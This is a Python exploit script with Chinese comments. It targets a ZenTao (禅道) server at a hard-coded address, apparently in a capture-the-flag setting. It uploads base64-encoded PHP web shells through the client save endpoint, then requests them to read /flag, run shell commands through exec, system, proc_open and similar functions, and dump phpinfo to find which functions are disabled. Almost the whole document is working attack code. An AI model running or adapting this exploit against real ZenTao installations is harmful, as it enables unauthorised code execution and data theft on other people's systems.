#!/usr/bin/env python3
"""
禅道漏洞利用 - 绕过 disable_functions
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def try_all_execution_methods():
    """尝试所有可能的 PHP 代码执行方法"""
    base_url = "http://47.113.178.182:32829"

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道漏洞 - 尝试多种 PHP 执行方法                        ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 各种 PHP 代码执行方法
    payloads = [
        # 1. 直接读取文件（不需要 system）
        ("file_get_contents", "<?php echo file_get_contents('/flag'); ?>"),
        ("readfile", "<?php readfile('/flag'); ?>"),
        ("file", "<?php print_r(file('/flag')); ?>"),
        ("fopen_fread", "<?php $f=fopen('/flag','r'); echo fread($f,1000); fclose($f); ?>"),

        # 2. 执行函数（如果没被禁用）
        ("exec", "<?php echo exec('cat /flag'); ?>"),
        ("shell_exec", "<?php echo shell_exec('cat /flag'); ?>"),
        ("passthru", "<?php passthru('cat /flag'); ?>"),
        ("system", "<?php system('cat /flag'); ?>"),
        ("popen", "<?php $p=popen('cat /flag','r'); while(!feof($p)){echo fgets($p);} pclose($p); ?>"),
        ("proc_open", "<?php $p=proc_open('cat /flag',array(1=>array('pipe','w')),$pipes); echo stream_get_contents($pipes[1]); ?>"),

        # 3. 反引号
        ("backticks", "<?php echo `cat /flag`; ?>"),

        # 4. 扫描目录
        ("scandir_root", "<?php print_r(scandir('/')); ?>"),
        ("glob", "<?php print_r(glob('/*flag*')); ?>"),

        # 5. 组合方法
        ("combined", "<?php if(file_exists('/flag')){echo file_get_contents('/flag');}else{echo 'NOT FOUND';} ?>"),
    ]

    successful_methods = []

    for method_name, payload in payloads:
        print(f"\n[{len(successful_methods)+1}] 尝试方法: {method_name}")
        print(f"    Payload: {payload[:60]}...")

        # Base64 编码
        encoded = base64.b64encode(payload.encode()).decode()

        filename = f"{method_name}.php"
        upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

        try:
            # 上传
            resp = requests.post(upload_url, data=encoded, timeout=10)

            if resp.status_code == 200:
                # 访问
                shell_url = f"{base_url}/zentao/data/client/1/{filename}"
                resp = requests.get(shell_url, timeout=10)

                if resp.status_code == 200 and resp.text.strip():
                    print(f"    ✓ 有输出! 长度: {len(resp.text)} bytes")
                    print(f"    输出: {resp.text[:200]}")

                    # 检查是否包含 flag
                    if 'flag{' in resp.text.lower() or 'ctf{' in resp.text.lower() or len(resp.text) > 10:
                        print(f"\n    {'='*66}")
                        print(f"    🚩 方法 [{method_name}] 可能成功!")
                        print(f"    {'='*66}")
                        print(f"    完整输出:")
                        print(f"    {resp.text}")
                        print(f"    {'='*66}")

                        successful_methods.append((method_name, shell_url, resp.text))

                        # 如果明确找到 flag，停止
                        if 'flag{' in resp.text.lower() or 'ctf{' in resp.text.lower():
                            print(f"\n    ✓✓✓ 找到 Flag! ✓✓✓")
                            return resp.text
                else:
                    print(f"    ✗ 无输出或失败")

        except Exception as e:
            print(f"    ✗ 错误: {e}")

    # 显示所有成功的方法
    if successful_methods:
        print("\n" + "=" * 70)
        print(f"成功的方法总结 ({len(successful_methods)} 个):")
        print("=" * 70)
        for method, url, output in successful_methods:
            print(f"\n[{method}]")
            print(f"  URL: {url}")
            print(f"  输出: {output[:100]}")

    return None


def check_phpinfo():
    """检查 phpinfo 看看哪些函数被禁用"""
    base_url = "http://47.113.178.182:32829"

    print("\n[*] 检查 PHP 配置...")

    payload = "<?php phpinfo(); ?>"
    encoded = base64.b64encode(payload.encode()).decode()

    upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName=info.php"

    try:
        requests.post(upload_url, data=encoded, timeout=10)

        shell_url = f"{base_url}/zentao/data/client/1/info.php"
        resp = requests.get(shell_url, timeout=10)

        if resp.status_code == 200 and len(resp.text) > 1000:
            print("[+] phpinfo 可用!")

            # 查找 disable_functions
            if 'disable_functions' in resp.text.lower():
                import re
                match = re.search(r'disable_functions.*?<td[^>]*>(.*?)</td>', resp.text, re.IGNORECASE | re.DOTALL)
                if match:
                    disabled = match.group(1).strip()
                    print(f"[*] 禁用的函数: {disabled[:200]}")
        else:
            print("[-] phpinfo 可能被禁用")

    except Exception as e:
        print(f"[-] 检查失败: {e}")


def main():
    # 检查 PHP 配置
    check_phpinfo()

    # 尝试所有执行方法
    result = try_all_execution_methods()

    if result:
        print("\n" + "=" * 70)
        print("🎉 最终结果:")
        print("=" * 70)
        print(result)
        print("=" * 70)
    else:
        print("\n[-] 未能成功获取 Flag")
        print("[*] 可能需要:")
        print("    1. 查看上面成功的方法，手动访问 URL")
        print("    2. 尝试其他绕过技术")
        print("    3. 检查 flag 文件的实际位置")


if __name__ == "__main__":
    main()
